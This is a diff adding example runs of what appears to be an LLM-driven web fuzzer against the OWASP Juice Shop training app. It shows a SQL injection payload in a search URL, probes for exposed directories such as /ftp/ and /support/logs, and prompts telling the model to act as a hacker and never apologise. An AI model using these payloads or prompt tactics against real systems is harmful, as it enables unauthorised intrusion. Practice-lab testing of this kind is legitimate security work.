@@ -25,3 +25,34 @@ LEVEL 1:
 [+] Detector: Yes
 You got it! Hacked!
 ```
+```
+LEVEL 2:
+[+] Start: : Analyse this URL: https://juice-shop.herokuapp.com/rest/products/search?q= . Act as an hacker and append an attack payload to exploit vulnerability. Return only the attack vector and never normale text. Do not apologize if an error will happen!
+[+] Fuzzer: https://juice-shop.herokuapp.com/rest/products/search?q=' OR '1'='1
+[+] Detector: HTTP/1.1 200 OK b'{"status":"success","data":[{"id":1,"name":...
+[+] Detector: Yes
+You got it! Hacked!
+```
+```
+LEVEL 3:
+[+] Start: : Find directory listing by extending this url: https://juice-shop.herokuapp.com/ from a web shop. Return only one URL and do not repeat an url and never normale text. Do not apologize if an error will happen!.
+[+] Fuzzer: https://juice-shop.herokuapp.com/ftp/
+[+] Detector: HTTP/1.1 200 OK b'<!DOCTYPE html>\n<html>\n  <head>\n   ...'
+[+] Detector: Yes
+You got it! Hacked!
+```
+
+```
+LEVEL 4:
+[+] Start: : The target is a web shop. Find common technical directorys by extending this url: https://juice-shop.herokuapp.com/support/ . Do not use one or more dots! Return only one URL and do not repeat an url and never normale text. Do not apologize if an error will happen!. You have already tried: 
+[+] Fuzzer: https://juice-shop.herokuapp.com/support/admin
+[+] Detector: HTTP/1.1 200 OK b'<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich &....'
+[+] Detector: No
+[+] Fuzzer: https://juice-shop.herokuapp.com/support/config
+[+] Detector: HTTP/1.1 200 OK b'<!--\n  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Jui....'
+[+] Detector: No
+[+] Fuzzer: https://juice-shop.herokuapp.com/support/logs
+[+] Detector: HTTP/1.1 200 OK b'<!DOCTYPE html>\n<html>\n  ....'
+[+] Detector: Yes
+You got it! Hacked!
+```
